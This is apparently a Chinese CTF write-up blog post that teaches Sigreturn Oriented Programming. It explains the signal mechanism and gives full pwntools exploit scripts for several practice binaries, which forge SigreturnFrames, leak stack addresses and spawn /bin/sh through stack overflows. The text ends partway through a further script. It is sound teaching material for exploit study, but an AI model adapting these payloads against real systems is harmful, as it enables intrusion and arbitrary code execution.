    <content type="html"><![CDATA[<blockquote><p>感觉到难大概是因为还没学会罢，愿在掌握之后再回头看能看到不一样的风景。</p></blockquote><h1>SROP(Sigreturn Oriented Programming)</h1><h2 id="理解"><a class="header-anchor" href="#理解">¶</a>理解</h2><p>网上很多大佬原理写的很好了，我这里就写点自己想法。</p><p>首先了解一下，signal 机制是类 unix 系统中进程之间相互传递信息的一种方法。</p><p><img src="https://blog-1310088624.cos.ap-nanjing.myqcloud.com/blog/ProcessOfSignalHandlering.png" alt=""></p><p>你不懂没关系（<s>我也不懂</s>），简单来说你发送 signal 的时候，会先把你的寄存器和 signal 信息存到你的用户栈里，然后跳到内核态去处理 signal，内核返回用户态执行信号处理之前，会设置信号处理函数的返回地址(x30)指向[vdso]中的 <strong>__kernel_rt_sigreturn</strong> 函数，来从栈中恢复取出之前所存的信息（<strong>无检验</strong>）。</p><p>那么我们试想一下，如果存在一个栈溢出漏洞。我们自己写一系列精心构造的数据，伪装成我们的寄存器和 signal 信息，然后先把返回地址覆盖成 <strong>Sigreturn</strong> ，后面紧跟着我们自己构造好的寄存器和 signal 信息，相当于我们恶意利用了这个恢复机制，于是我们可以控制 rip rsp 在内的所有寄存器，那么自然就可以控制程序执行了。</p><p>进一步，如果知道 <code>/bin/sh</code> 的地址，存在 syscall ，那么我们直接如下构造就可以 getshell 。</p><p><img src="https://blog-1310088624.cos.ap-nanjing.myqcloud.com/blog/srop-example-1.png" alt=""></p><p>但一般程序是不会直接给你 <code>/bin/sh</code> 的，你需要自己通过 read 往某个地址写。这就需要构造 SROP 链（关键gadget：<code>syscall;ret</code>），具体的我们下面看几个题。</p><hr><h2 id="利用前提"><a class="header-anchor" href="#利用前提">¶</a>利用前提</h2><p>大概是：</p><ol><li>syscall，signal 没 syscall 👦 玩毛 。</li><li>足够大的溢出空间，要能放得下伪造的 Frame。</li><li>好用的 gadget （非必要,详见 <code>smallest</code>），比如 pop rax 之类的，就算没有 <strong>Sigreturn</strong> ，x64 下把 rax 调到 15 后执行 syscall 是一样的效果。</li></ol><p>一般思路是想办法搞到 <code>/bin/sh</code> 的位置（没有就写一个）后利用 SROP 执行 execve ，其他的我不好说，直接看题吧。</p><hr><h2 id="例题"><a class="header-anchor" href="#例题">¶</a>例题</h2><p>额，大概是从易到难吧。后面要是追加就不算了。</p><h3 id="FUNSIGNALS（白给的-Sigreturn）"><a class="header-anchor" href="#FUNSIGNALS（白给的-Sigreturn）">¶</a>FUNSIGNALS（白给的 Sigreturn）</h3><h4 id="分析"><a class="header-anchor" href="#分析">¶</a>分析</h4><p>丢到 IDA 里面去，单纯的 SROP 题目都是比较简洁的。</p><p><img src="https://blog-1310088624.cos.ap-nanjing.myqcloud.com/blog/image-20220329111928988.png" alt="image-20220329111928988"></p><p>首先要看懂这个程序：</p><ol><li><code>mov dh, 4</code> 的意思在这里是 <code>RDX = 0x400</code>，不清楚的话可以去 gdb 下断点后按 r 再跑一遍自己验证。`</li><li>开头到第一个 syscall 意思就是在 rsp 的地方读入 0x400 的数据。</li><li>题目贴心的是，后面的 <code>push 0xF pop rax syscall</code>，相当于直接调用了 <strong>Sigreturn</strong> 了（RAX = 15）。后面的 <code>int 3</code> 你不用管它，我们 Sigreturn 的是自己构造的 Frame ，把 rsp 和 rip 🐑 了就没它的事了。</li></ol><p>我们要干的事也很简单，简单的构造一个恶意 Frame ，用 write 去泄露这个 flag 。直接调用 pwntools 构造。</p><h4 id="Exp"><a class="header-anchor" href="#Exp">¶</a>Exp</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#python2</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br><br>se      = <span class="hljs-keyword">lambda</span> data               :p.send(data) <br>sa      = <span class="hljs-keyword">lambda</span> delim,data         :p.sendafter(delim, data)<br>sl      = <span class="hljs-keyword">lambda</span> data               :p.sendline(data)<br>sla     = <span class="hljs-keyword">lambda</span> delim,data         :p.sendlineafter(delim, data)<br>sea     = <span class="hljs-keyword">lambda</span> delim,data         :p.sendafter(delim, data)<br>rc      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :p.recv(numb)<br>ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :p.recvuntil(delims, drop)<br>uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>info_addr = <span class="hljs-keyword">lambda</span> tag, addr        :p.info(tag + <span class="hljs-string">&#x27;: &#123;:#x&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(addr))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>(<span class="hljs-params">cmd=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>    gdb.attach(p,cmd)<br><br>p = process(<span class="hljs-string">&#x27;./FUNSIGNALS&#x27;</span>)<br><span class="hljs-comment"># p = remote(&#x27;hack.bckdr.in&#x27;,17002)</span><br>elf = ELF(<span class="hljs-string">&#x27;./FUNSIGNALS&#x27;</span>)<br>context(arch = elf.arch, os = <span class="hljs-string">&#x27;linux&#x27;</span>,log_level = <span class="hljs-string">&#x27;debug&#x27;</span>,terminal = [<span class="hljs-string">&#x27;tmux&#x27;</span>, <span class="hljs-string">&#x27;splitw&#x27;</span>, <span class="hljs-string">&#x27;-h&#x27;</span>])<br><br>frame=SigreturnFrame()<br>frame.rax = constants.SYS_write <span class="hljs-comment"># 1 is ok</span><br>frame.rdi = constants.STDOUT_FILENO <span class="hljs-comment"># 1 is ok</span><br>frame.rsi = elf.sym[<span class="hljs-string">&#x27;flag&#x27;</span>]<br>frame.rdx = <span class="hljs-number">100</span><br>frame.rip = elf.sym[<span class="hljs-string">&#x27;syscall&#x27;</span>]<br><br>p.sendline(<span class="hljs-built_in">str</span>(frame))<br>p.interactive()<br></code></pre></td></tr></table></figure><hr><h3 id="rootersctf-2019-srop（pop-rax-构造的-Sigreturn）"><a class="header-anchor" href="#rootersctf-2019-srop（pop-rax-构造的-Sigreturn）">¶</a>rootersctf_2019_srop（pop rax 构造的 Sigreturn）</h3><h4 id="分析-v2"><a class="header-anchor" href="#分析-v2">¶</a>分析</h4><p>程序逻辑也很简单：先输出 data 段 buf 内的信息，往 <code>rsp-0x40</code> 处写入 <code>0x400</code> 的数据。</p><p><img src="https://blog-1310088624.cos.ap-nanjing.myqcloud.com/blog/image-20220329141956305.png" alt="image-20220329141956305"></p><p>这题没有白给的 Sigreturn ，但是有个很好用的 gadget <code>pop rax syscall</code> 。</p><p>基本思路是：第一次伪造 Frame 在已知地址处写入 <code>/bin/sh</code> ，第二次伪造 Frame 进行一个 <code>/bin/sh</code> 的 <code>execve</code> 。</p><p>首先， 栈溢出覆盖 rip 为 <code>pop rax;syscall;leave;retn</code> 这个 gadget，后面紧跟 Sigreturn 调用号 15 和 第一个伪造的 Frame。</p><p>有必要说明一下 Frame 具体的构造：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python">fuck = SigreturnFrame()<br>fuck.rax = <span class="hljs-number">0</span><span class="hljs-comment"># read 调用号</span><br>fuck.rdi = <span class="hljs-number">0</span><span class="hljs-comment"># fd</span><br>fuck.rsi = <span class="hljs-number">0x402500</span><span class="hljs-comment"># buf</span><br>fuck.rdx = <span class="hljs-number">0x400</span><span class="hljs-comment"># count 不要写小了，没你好果汁吃(ᗜ_ᗜ）</span><br>fuck.rip = syscall_ret<span class="hljs-comment"># syscall;leave;retn</span><br>fuck.rsp = <span class="hljs-number">0x402500</span><span class="hljs-comment"># bss 段已知地址</span><br>fuck.rbp = <span class="hljs-number">0x402500</span><span class="hljs-comment"># bss 段已知地址</span><br></code></pre></td></tr></table></figure><p>那么我们预期中的程序流程是这样的：</p><ol><li>Sigreturn 恢复恶意 Frame 到寄存器 ，紧接着执行的是 Frame 中的 rip 也就是 <code>syscall;leave;ret</code> ，那么 <code>syscall</code> 就会先在 <code>0x402500</code> 处读入 <code>0x400</code> 的数据（ROP链++）。</li><li><code>leave;ret</code> 意思是 <code>mov rsp,rbp;pop rbp;pop rip</code> ，<code>mov rsp,rbp</code>因为我们构造的是一样的地址所以没影响，<code>pop rbp</code> 会把我们 ROP 链的前八个字节给 🐑 了。所以我们要在 ROP 链上先填充 8 字节的垃圾 rbp 地址，那么 <code>pop rip</code> 时就会执行我们的 ROP 链。（是不是感觉有点栈迁移那味👦）</li></ol><p>ROP 链我们明显要用来伪造第二个 Frame，我们在 <code>0x402500</code> 写入 ROP 链同时我们顺带写上 <code>/bin/sh\0</code>，具体的直接看 Exp 。</p><h4 id="Exp-v2"><a class="header-anchor" href="#Exp-v2">¶</a>Exp</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#python2</span><br><span class="hljs-comment"># -*- coding: utf-8 -*</span><br><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br><br>se      = <span class="hljs-keyword">lambda</span> data               :p.send(data) <br>sa      = <span class="hljs-keyword">lambda</span> delim,data         :p.sendafter(delim, data)<br>sl      = <span class="hljs-keyword">lambda</span> data               :p.sendline(data)<br>sla     = <span class="hljs-keyword">lambda</span> delim,data         :p.sendlineafter(delim, data)<br>sea     = <span class="hljs-keyword">lambda</span> delim,data         :p.sendafter(delim, data)<br>rc      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :p.recv(numb)<br>ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :p.recvuntil(delims, drop)<br>uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>info_addr = <span class="hljs-keyword">lambda</span> tag, addr        :p.info(tag + <span class="hljs-string">&#x27;: &#123;:#x&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(addr))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>(<span class="hljs-params"><span class="hljs-built_in">breakpoint</span>=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>    glibc_dir = <span class="hljs-string">&#x27;~/Exps/Glibc/glibc-2.27/&#x27;</span><br>    gdbscript = <span class="hljs-string">&#x27;directory %smalloc/\n&#x27;</span> % glibc_dir<br>    gdbscript += <span class="hljs-string">&#x27;directory %sstdio-common/\n&#x27;</span> % glibc_dir<br>    gdbscript += <span class="hljs-string">&#x27;directory %sstdlib/\n&#x27;</span> % glibc_dir<br>    gdbscript += <span class="hljs-string">&#x27;directory %slibio/\n&#x27;</span> % glibc_dir<br>    elf_base = <span class="hljs-built_in">int</span>(os.popen(<span class="hljs-string">&#x27;pmap &#123;&#125;| awk \x27&#123;&#123;print \x241&#125;&#125;\x27&#x27;</span>.<span class="hljs-built_in">format</span>(p.pid)).readlines()[<span class="hljs-number">1</span>], <span class="hljs-number">16</span>) <span class="hljs-keyword">if</span> elf.pie <span class="hljs-keyword">else</span> <span class="hljs-number">0</span><br>    gdbscript += <span class="hljs-string">&#x27;b *&#123;:#x&#125;\n&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">int</span>(<span class="hljs-built_in">breakpoint</span>) + elf_base) <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(<span class="hljs-built_in">breakpoint</span>, <span class="hljs-built_in">int</span>) <span class="hljs-keyword">else</span> <span class="hljs-built_in">breakpoint</span><br>    gdb.attach(p, gdbscript)<br>    time.sleep(<span class="hljs-number">1</span>)<br><br>elf = ELF(<span class="hljs-string">&#x27;./rootersctf_2019_srop&#x27;</span>)<br>context(arch = elf.arch, os = <span class="hljs-string">&#x27;linux&#x27;</span>,log_level = <span class="hljs-string">&#x27;debug&#x27;</span>,terminal = [<span class="hljs-string">&#x27;tmux&#x27;</span>, <span class="hljs-string">&#x27;splitw&#x27;</span>, <span class="hljs-string">&#x27;-h&#x27;</span>])<br>p = process(<span class="hljs-string">&#x27;./rootersctf_2019_srop&#x27;</span>)<br>debug()<br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">.text:0000000000401032                 pop     rax</span><br><span class="hljs-string">.text:0000000000401033                 syscall                 ; LINUX - sys_read</span><br><span class="hljs-string">.text:0000000000401035                 leave</span><br><span class="hljs-string">.text:0000000000401036                 retn</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>rax_syscall_leave_ret = <span class="hljs-number">0x401032</span><br>syscall_ret = <span class="hljs-number">0x401033</span><br>fuck = SigreturnFrame()<br>fuck.rax = <span class="hljs-number">0</span><br>fuck.rdi = <span class="hljs-number">0</span><br>fuck.rsi = <span class="hljs-number">0x402500</span><br>fuck.rdx = <span class="hljs-number">0x400</span><br>fuck.rip = syscall_ret<br>fuck.rsp = <span class="hljs-number">0x402500</span><br>fuck.rbp = <span class="hljs-number">0x402500</span><br><br>payload=flat(<br>    [<span class="hljs-string">&#x27;A&#x27;</span>*<span class="hljs-number">0x80</span>,<span class="hljs-number">0xdeadbeef</span>,rax_syscall_leave_ret,<span class="hljs-number">15</span>,fuck]<br>)<br>sl(payload)<br><br>wsnd = SigreturnFrame()<br>wsnd.rax = <span class="hljs-number">59</span><br>wsnd.rdi = <span class="hljs-number">0x402500</span> + <span class="hljs-number">0x200</span><br>wsnd.rsi = <span class="hljs-number">0</span><br>wsnd.rdx = <span class="hljs-number">0</span><br>wsnd.rip = syscall_ret<br>wsnd.rsp = <span class="hljs-number">0xdeadbeef</span><br>wsnd.rbp = <span class="hljs-number">0xdeadbeef</span><br><span class="hljs-comment"># print(len((p64(0xdeadbeef)+p64(rax_syscall_leave_ret)+p64(15)+str(wsnd))))  !!! 272 !!!</span><br>sl((p64(<span class="hljs-number">0xdeadbeef</span>)+p64(rax_syscall_leave_ret)+p64(<span class="hljs-number">15</span>)+<span class="hljs-built_in">str</span>(wsnd)).ljust(<span class="hljs-number">0x200</span>,<span class="hljs-string">&#x27;\0&#x27;</span>)+<span class="hljs-string">&#x27;/bin/sh\0&#x27;</span>) <span class="hljs-comment"># bin_sh = 0x402500 + 0x200</span><br><br>p.interactive()<br></code></pre></td></tr></table></figure><hr><h3 id="smallest（通过-read-字节数构造的-Sigreturn）"><a class="header-anchor" href="#smallest（通过-read-字节数构造的-Sigreturn）">¶</a>smallest（通过 read 字节数构造的 Sigreturn）</h3><h4 id="分析-v3"><a class="header-anchor" href="#分析-v3">¶</a>分析</h4><p>程序越来越短，gaget 越来越少 QWQ。这个相当直接，在 rsp 写处写 <code>0x400</code> 的数据，剩下的爱咋咋地。</p><p><img src="https://blog-1310088624.cos.ap-nanjing.myqcloud.com/blog/image-20220329152145281.png" alt="image-20220329152145281"></p><p>并且这题在运行时并没有一个较为固定的可读可写地址，需要 leak 栈地址。</p><p><img src="https://blog-1310088624.cos.ap-nanjing.myqcloud.com/blog/image-20220329161716980.png" alt="image-20220329161716980"></p><p><strong>关键点：x64 调用约定中说明了函数调用的返回值是存在 rax 里面的，而 <code>SYS_read</code> 返回值是读取的字节个数。</strong></p><figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs gherkin">+───────+───────+──────────────+──────────────────+<br>|<span class="hljs-string"> %rax  </span>|<span class="hljs-string"> Name  </span>|<span class="hljs-string"> Entry point  </span>|<span class="hljs-string"> Implementation   </span>|<br>+───────+───────+──────────────+──────────────────+<br>|<span class="hljs-string"> 0     </span>|<span class="hljs-string"> read  </span>|<span class="hljs-string"> sys_read     </span>|<span class="hljs-string"> fs/read_write.c  </span>|<br>|<span class="hljs-string"> 1     </span>|<span class="hljs-string"> write </span>|<span class="hljs-string"> sys_write    </span>|<span class="hljs-string"> fs/read_write.c  </span>|<br>+───────+───────+──────────────+──────────────────+<br></code></pre></td></tr></table></figure><p>而我们发现 write 的调用号是 1 ，意思是我们在读入一个字节的情况下跳过 <code>xor rax,rax</code> 这一步就会 write 出 rsp。</p><ol><li><p>第一次执行先 read 塞入三个 <code>vuln_addr = 0x4000B0</code>，控制程序流程，每一次 ret 都执行一次 vuln。</p></li><li><p>第二次执行仅 read 塞入一个字节，部分覆盖掉返回地址为 <code>NOxor_vuln = 0x4000B3</code> 。</p></li><li><p>第三次执行，由于 write <strong>不受</strong> <code>\x00</code> 截断影响，到 syscall 时就会从 rsp 指针处开始 leak 出此时的栈信息（注意不是 rsp 指针地址，但是会输出很多栈内的地址）。</p></li><li><p>第四次执行，read 塞入 <code>vuln_addr</code> 以及 Frame。</p></li><li><p>第五次执行，read 塞入 <code>syscall;ret</code>  地址以及 Frame 前 7 个字节（凑齐 <code>RAX = 15</code>）。</p></li><li><p>到这就和上题差不多了，第一个 Frame 读入 ROP 链，第二个 Frame 执行 <code>/bin/sh\0</code>。不过 ROP 构造还是要先读入一次，后续凑满 15 字节这样利用。熟悉流程后难度不大。</p></li></ol><h4 id="Exp-execve"><a class="header-anchor" href="#Exp-execve">¶</a>Exp(execve)</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#python2</span><br><span class="hljs-comment"># -*- coding: utf-8 -*</span><br><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br><br>se      = <span class="hljs-keyword">lambda</span> data               :p.send(data) <br>sa      = <span class="hljs-keyword">lambda</span> delim,data         :p.sendafter(delim, data)<br>sl      = <span class="hljs-keyword">lambda</span> data               :p.sendline(data)<br>sla     = <span class="hljs-keyword">lambda</span> delim,data         :p.sendlineafter(delim, data)<br>sea     = <span class="hljs-keyword">lambda</span> delim,data         :p.sendafter(delim, data)<br>rc      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :p.recv(numb)<br>ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :p.recvuntil(delims, drop)<br>uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>info_addr = <span class="hljs-keyword">lambda</span> tag, addr        :p.info(tag + <span class="hljs-string">&#x27;: &#123;:#x&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(addr))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>(<span class="hljs-params"><span class="hljs-built_in">breakpoint</span>=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>    glibc_dir = <span class="hljs-string">&#x27;~/Exps/Glibc/glibc-2.27/&#x27;</span><br>    gdbscript = <span class="hljs-string">&#x27;directory %smalloc/\n&#x27;</span> % glibc_dir<br>    gdbscript += <span class="hljs-string">&#x27;directory %sstdio-common/\n&#x27;</span> % glibc_dir<br>    gdbscript += <span class="hljs-string">&#x27;directory %sstdlib/\n&#x27;</span> % glibc_dir<br>    gdbscript += <span class="hljs-string">&#x27;directory %slibio/\n&#x27;</span> % glibc_dir<br>    elf_base = <span class="hljs-built_in">int</span>(os.popen(<span class="hljs-string">&#x27;pmap &#123;&#125;| awk \x27&#123;&#123;print \x241&#125;&#125;\x27&#x27;</span>.<span class="hljs-built_in">format</span>(p.pid)).readlines()[<span class="hljs-number">1</span>], <span class="hljs-number">16</span>) <span class="hljs-keyword">if</span> elf.pie <span class="hljs-keyword">else</span> <span class="hljs-number">0</span><br>    gdbscript += <span class="hljs-string">&#x27;b *&#123;:#x&#125;\n&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">int</span>(<span class="hljs-built_in">breakpoint</span>) + elf_base) <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(<span class="hljs-built_in">breakpoint</span>, <span class="hljs-built_in">int</span>) <span class="hljs-keyword">else</span> <span class="hljs-built_in">breakpoint</span><br>    gdb.attach(p, gdbscript)<br>    time.sleep(<span class="hljs-number">1</span>)<br><br>elf = ELF(<span class="hljs-string">&#x27;./smallest&#x27;</span>)<br>context(arch = elf.arch, os = <span class="hljs-string">&#x27;linux&#x27;</span>,log_level = <span class="hljs-string">&#x27;debug&#x27;</span>,terminal = [<span class="hljs-string">&#x27;tmux&#x27;</span>, <span class="hljs-string">&#x27;splitw&#x27;</span>, <span class="hljs-string">&#x27;-h&#x27;</span>])<br>p = process(<span class="hljs-string">&#x27;./smallest&#x27;</span>)<br><span class="hljs-comment"># debug()</span><br><span class="hljs-comment"># p = remote(&#x27;node4.buuoj.cn&#x27;,26278)</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">.text:00000000004000B0                 xor     rax, rax</span><br><span class="hljs-string">.text:00000000004000B3                 mov     edx, 400h       ; count</span><br><span class="hljs-string">.text:00000000004000B8                 mov     rsi, rsp        ; buf</span><br><span class="hljs-string">.text:00000000004000BB                 mov     rdi, rax        ; fd</span><br><span class="hljs-string">.text:00000000004000BE                 syscall                 ; LINUX - sys_read</span><br><span class="hljs-string">.text:00000000004000C0                 retn</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>vuln_addr = <span class="hljs-number">0x4000B0</span><br>NOxor_vuln = <span class="hljs-number">0x4000B3</span><br>syscall_ret = <span class="hljs-number">0x4000BE</span><br>fuck = SigreturnFrame()<br>fuck.rax = <span class="hljs-number">0</span><br>fuck.rdi = <span class="hljs-number">0</span><br><br>payload=flat(<br>    [vuln_addr,vuln_addr,vuln_addr]<br>)<br>se(payload)<br>se(<span class="hljs-string">&#x27;\xB3&#x27;</span>)<br>rc(<span class="hljs-number">8</span>)<br>stack_addr = uu64(rc(<span class="hljs-number">8</span>))<br>stack_addr = stack_addr&gt;&gt;<span class="hljs-number">4</span><br>stack_addr = stack_addr&lt;&lt;<span class="hljs-number">4</span><br>info_addr(<span class="hljs-string">&#x27;stack&#x27;</span>,stack_addr)<br>fuck = SigreturnFrame()<br>fuck.rax = <span class="hljs-number">0</span><br>fuck.rdi = <span class="hljs-number">0</span><br>fuck.rsi = stack_addr<br>fuck.rdx = <span class="hljs-number">0x400</span><br>fuck.rsp = stack_addr<br>fuck.rip = syscall_ret<br><br>payload=flat(<br>    [vuln_addr,<span class="hljs-number">0</span>,fuck]<br>)<br>se(payload)<br>se(p64(NOxor_vuln)+<span class="hljs-built_in">str</span>(fuck)[:<span class="hljs-number">7</span>])<br>wsnd = SigreturnFrame()<br>wsnd.rax = <span class="hljs-number">59</span><br>wsnd.rdi = stack_addr + <span class="hljs-number">0x200</span><br>wsnd.rsi = <span class="hljs-number">0</span><br>wsnd.rdx = <span class="hljs-number">0</span><br>wsnd.rsp = stack_addr<br>wsnd.rip = syscall_ret<br>payload=(p64(vuln_addr)+p64(<span class="hljs-number">0</span>)+<span class="hljs-built_in">str</span>(wsnd)).ljust(<span class="hljs-number">0x200</span>,<span class="hljs-string">&#x27;\0&#x27;</span>)+<span class="hljs-string">&#x27;/bin/sh\0&#x27;</span><br>se(payload)<br>se(p64(NOxor_vuln)+<span class="hljs-built_in">str</span>(wsnd)[:<span class="hljs-number">7</span>])<br><br>p.interactive()<br></code></pre></td></tr></table></figure><h4 id="Exp-orw"><a class="header-anchor" href="#Exp-orw">¶</a>Exp(orw)</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span 